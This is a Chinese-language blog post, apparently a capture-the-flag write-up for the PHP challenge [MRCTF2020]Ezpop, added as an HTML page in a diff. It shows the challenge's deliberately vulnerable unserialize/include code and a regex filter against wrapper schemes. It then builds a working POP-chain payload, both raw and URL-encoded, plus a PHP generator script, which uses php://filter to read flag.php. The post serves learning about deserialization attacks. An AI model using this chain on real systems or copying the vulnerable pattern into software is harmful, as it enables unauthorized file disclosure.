@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[MRCTF2020]Ezpop | Fantasy.'s Home</title><meta name="author" content="Fantasy."><meta name="copyright" content="Fantasy."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="简单的pop链，魔术方法总结。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[MRCTF2020]Ezpop">
+<meta property="og:url" content="https://relax-1626.github.io/2026/04/23/MRCTF2020-Ezpop/index.html">
+<meta property="og:site_name" content="Fantasy.&#39;s Home">
+<meta property="og:description" content="简单的pop链，魔术方法总结。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://relax-1626.github.io/img/liang.jpg">
+<meta property="article:published_time" content="2026-04-23T11:29:18.000Z">
+<meta property="article:modified_time" content="2026-04-24T03:32:26.100Z">
+<meta property="article:author" content="Fantasy.">
+<meta property="article:tag" content="反序列化漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relax-1626.github.io/img/liang.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[MRCTF2020]Ezpop",
+  "url": "https://relax-1626.github.io/2026/04/23/MRCTF2020-Ezpop/",
+  "image": "https://relax-1626.github.io/img/liang.jpg",
+  "datePublished": "2026-04-23T11:29:18.000Z",
+  "dateModified": "2026-04-24T03:32:26.100Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Fantasy.",
+      "url": "https://relax-1626.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://relax-1626.github.io/2026/04/23/MRCTF2020-Ezpop/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><!--if !theme.asset.busuanzi && (theme.busuanzi.site_uv || theme.busuanzi.site_pv || theme.busuanzi.page_pv)link(rel="preconnect" href="//busuanzi.ibruce.info")--><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[MRCTF2020]Ezpop',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/preloader.css"><script src="/js/preloader.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="preloader"><div class="terminal"><div class="terminal-header"><div class="terminal-button"></div><div class="terminal-button"></div><div class="terminal-button"></div></div><div class="terminal-body"><p>启动中...</p></div></div></div><div class="bg-animation" id="web_bg" style="background-image: url(/img/bak.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/liang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 晤初</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 拾岁</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分笺</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 晤心</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Fantasy.'s Home</span></a><a class="nav-page-title" href="/"><span class="site-name">[MRCTF2020]Ezpop</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 晤初</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 拾岁</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分笺</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 晤心</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[MRCTF2020]Ezpop</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-04-23T11:29:18.000Z" title="发表于 2026-04-23 19:29:18">2026-04-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-04-24T03:32:26.100Z" title="更新于 2026-04-24 11:32:26">2026-04-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E9%A2%98%E8%A7%A3/">CTF题解</a></span></div><div class="meta-secondline"><!--else if theme.busuanzi.page_pv+pvBlock('', 'post-meta-pv-cv', '')
+  span#busuanzi_value_page_pv
+    i.fa-solid.fa-spinner.fa-spin
+--></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>反序列化理解起来感觉有点绕，熟能生巧嘛。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>进入题目页给出代码：</p>
+<pre><code>Welcome to index.php
+&lt;?php
+class Modifier &#123;
+    protected  $var;
+    public function append($value)&#123;
+        include($value);
+    &#125;
+    public function __invoke()&#123;
+        $this-&gt;append($this-&gt;var);
+    &#125;
+&#125;
+
+class Show&#123;
+    public $source;
+    public $str;
+    public function __construct($file=&#39;index.php&#39;)&#123;
+        $this-&gt;source = $file;
+        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    &#125;
+    public function __toString()&#123;
+        return $this-&gt;str-&gt;source;
+    &#125;
+
+    public function __wakeup()&#123;
+        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+            echo &quot;hacker&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Test&#123;
+    public $p;
+    public function __construct()&#123;
+        $this-&gt;p = array();
+    &#125;
+
+    public function __get($key)&#123;
+        $function = $this-&gt;p;
+        return $function();
+    &#125;
+&#125;
+
+if(isset($_GET[&#39;pop&#39;]))&#123;
+    @unserialize($_GET[&#39;pop&#39;]);
+&#125;
+else&#123;
+    $a=new Show;
+    highlight_file(__FILE__);
+&#125;
+</code></pre>
+<p>通过<code>pop</code>传参读取flag.php文件,在<code>Modifier</code>类中，存在任意文件包含<code>include</code>关键字，所以首先就是构造Modifier对象序列化字符串，然后就需要其他的来触发这个<code>__invoke()</code>，即<code>将对象当作函数调用时触发</code>。</p>
+<p>继续看下面两个类：<code>Show</code>和<code>Test</code>。</p>
+<p>在<code>Show</code>类中，存在两个属性<code>source</code>和<code>str</code>，三个魔术方法：</p>
+<ul>
+<li><code>__construct()</code>:在使用new创建一个类对象的实例时，会被自动调用。通常用来给对象的属性赋初始值，相当于构造函数。这里是给新对象的<code>source</code>属性赋值。</li>
+<li><code>__toString()</code>:当对象被当作字符串时自动调用。必须返回字符串，否则报错。这里返回对象的<code>str</code>属性的<code>source</code>属性。</li>
+<li><code>__wakeup()</code>：序列化字符串在反序列化完成后会被自动调用。这里存在一个正则表达式<code>preg_match()</code>判断该对象的<code>source</code>匹配第一参数内容。</li>
+</ul>
+<p>在<code>Test</code>类中，一属性<code>p</code>两魔术方法<code>__construct()</code>和<code>__get()</code></p>
+<ul>
+<li><code>_get()</code>:读取不可访问或未定义的属性时触发。这里使得<code>$function</code>赋值为对象的<code>p</code>属性，然后将其<code>$function()</code>当作函数调用</li>
+</ul>
+<p>结合以上，怎么触发<code>__invoke()</code>？我们需要将对象当作函数调用，所以最内层应该是：</p>
+<pre><code>O:8:&quot;Modifier&quot;:1:&#123;s:3:&quot;var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;
+</code></pre>
+<p>上下文唯一一处将对象当作函数调用是<code>_get()</code>方法，赋值<code>Test</code>对象属性<code>p</code>为<code>Modifier</code>对象，所以第二层：</p>
+<pre><code>O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:3:&quot;var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;
+</code></pre>
+<p>考虑如何触发<code>__get()</code>方法，即在读取不可访问或未定义的属性时触发，总观下来即触发<code>__toString()</code>方法，其中返回对象的<code>str</code>属性的<code>source</code>属性，使<code>source</code>不可访问即可。而<code>Show</code>对象的<code>source</code>这里不需要可以设置为<code>N</code>，所以第三层：</p>
+<pre><code>O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:3:&quot;var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;
+</code></pre>
+<p>回到最初，<code>pop</code>总归会触发<code>__wakeup()</code>方法，正则表达式<code>preg_match</code>将第二参数也就是对象的<code>source</code>属性当作字符串处理触发<code>toString()</code>，构成完整pop链。这一层的<code>Show</code>对象不需要<code>str</code>属性，设置为<code>N</code>。按照<code>PHP</code>序列化的语法，对象内的属性赋值结束后，不需要在对象的闭合大括号<code>PHP</code>后面再加分号。所以最后一层：</p>
+<pre><code>O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:3:&quot;var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N&#125;
+</code></pre>
+<p>忘记了一个细节问题：<code>Modifier</code>类中的var属性是<code>protected</code>类型,在序列化时必须是<code>空字节*空字节属性名</code>格式。</p>
+<p>两种解决方法：</p>
+<ul>
+<li>把以下<code>payload</code>进行<code>URL</code>编码，然后在<code>*</code>左右添加<code>%00</code>。</li>
+<li>使用<code>PHP脚本</code>构造序列化。</li>
+</ul>
+<p>第一个方法：</p>
+<pre><code>O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;*var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;
+</code></pre>
+<p>这里的<code>Modifier</code>对象属性<code>var</code>必须是六个字符符合<code>空字节*空字节var</code>格式。<code>URL</code>编码后添加<code>%00</code>。</p>
+<pre><code>?pop=O%3A4%3A&quot;Show&quot;%3A2%3A%7Bs%3A6%3A&quot;source&quot;%3BO%3A4%3A&quot;Show&quot;%3A2%3A%7Bs%3A6%3A&quot;source&quot;%3BN%3Bs%3A3%3A&quot;str&quot;%3BO%3A4%3A&quot;Test&quot;%3A1%3A%7Bs%3A1%3A&quot;p&quot;%3BO%3A8%3A&quot;Modifier&quot;%3A1%3A%7Bs%3A6%3A&quot;%00*%00var&quot;%3Bs%3A57%3A&quot;php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php&quot;%3B%7D%7D%7Ds%3A3%3A&quot;str&quot;%3BN%3B%7D
+</code></pre>
+<p>第二个方法：<br><code>PHP脚本</code></p>
+<pre><code>&lt;?php
+class Modifier&#123;
+    protected $var = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
+&#125;
+class Test&#123;
+    public $p;
+&#125;
+class Show&#123;
+    public $source;
+    public $str;
+&#125;
+
+//搭建链
+$mod = new Modifier();
+$test = new Test();
+$test-&gt;p = $mod;
+
+$innerShow = new Show();
+$outerShow = new Show();
+
+$innerShow-&gt;source = null;
+$innerShow-&gt;str = $test;
+
+$outerShow-&gt;source = $innerShow;
+$outerShow-&gt;str = null;
+
+echo urlencode(serialize($outerShow));
+?&gt;
+</code></pre>
+<p>运行结束后获得方法一同等payload。输入获取flag。</p>
+<h2 id="拓展和知识点总结"><a href="#拓展和知识点总结" class="headerlink" title="拓展和知识点总结"></a>拓展和知识点总结</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://relax-1626.github.io">Fantasy.</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://relax-1626.github.io/2026/04/23/MRCTF2020-Ezpop/">https://relax-1626.github.io/2026/04/23/MRCTF2020-Ezpop/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://relax-1626.github.io" target="_blank">Fantasy.'s Home</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></div><div class="post-share"><div class="social-share" data-image="/img/liang.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/22/BJDCTF2020-Cookieissostable/" title="[BJDCTF2020]Cookieissostable"><img class="cover" src="/img/Cookieissostable/fengmian.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[BJDCTF2020]Cookieissostable</div></div><div class="info-2"><div class="info-item-1">总结SSTI问题</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/04/01/ZJCTF-2019-NiZhuanSiWei/" title="[ZJCTF 2019]NiZhuanSiWei1"><img class="cover" src="/img/NiZhuanSiWei/fengmian.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-01</div><div class="info-item-2">[ZJCTF 2019]NiZhuanSiWei1</div></div><div class="info-2"><div class="info-item-1">本文解析如何通过PHP伪协议和反序列化漏洞，绕过源码限制，利用data://和php://filter构造payload获得flag。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/liang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Fantasy.</div><div class="author-info-description">A technology blog</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Relax-1626"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Fantasy.的博客，如有错误及其他问题请大佬多多指教！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-number">1.</span> <span class="toc-text">[MRCTF2020]Ezpop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E5%92%8C%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">拓展和知识点总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/23/MRCTF2020-Ezpop/" title="[MRCTF2020]Ezpop">[MRCTF2020]Ezpop</a><time datetime="2026-04-23T11:29:18.000Z" title="发表于 2026-04-23 19:29:18">2026-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/22/BJDCTF2020-Cookieissostable/" title="[BJDCTF2020]Cookieissostable"><img src="/img/Cookieissostable/fengmian.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[BJDCTF2020]Cookieissostable"/></a><div class="content"><a class="title" href="/2026/04/22/BJDCTF2020-Cookieissostable/" title="[BJDCTF2020]Cookieissostable">[BJDCTF2020]Cookieissostable</a><time datetime="2026-04-22T01:53:45.000Z" title="发表于 2026-04-22 09:53:45">2026-04-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/03/GYCTF2020-Blacklist/" title="[GYCTF2020]Blacklist1"><img src="/img/Blacklist1/fengmian.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[GYCTF2020]Blacklist1"/></a><div class="content"><a class="title" href="/2026/04/03/GYCTF2020-Blacklist/" title="[GYCTF2020]Blacklist1">[GYCTF2020]Blacklist1</a><time datetime="2026-04-03T02:18:36.000Z" title="发表于 2026-04-03 10:18:36">2026-04-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/01/ZJCTF-2019-NiZhuanSiWei/" title="[ZJCTF 2019]NiZhuanSiWei1"><img src="/img/NiZhuanSiWei/fengmian.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[ZJCTF 2019]NiZhuanSiWei1"/></a><div class="content"><a class="title" href="/2026/04/01/ZJCTF-2019-NiZhuanSiWei/" title="[ZJCTF 2019]NiZhuanSiWei1">[ZJCTF 2019]NiZhuanSiWei1</a><time datetime="2026-04-01T02:57:38.000Z" title="发表于 2026-04-01 10:57:38">2026-04-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"></div><div class="footer_custom_text">萌新菜鸟希望有问题多多指正</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><!--if theme.busuanzi.site_uv || theme.busuanzi.site_pv || theme.busuanzi.page_pvscript(async data-pjax src=theme.asset.busuanzi ? url_for(theme.asset.busuanzi) : '//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js')
+--></div></body></html>
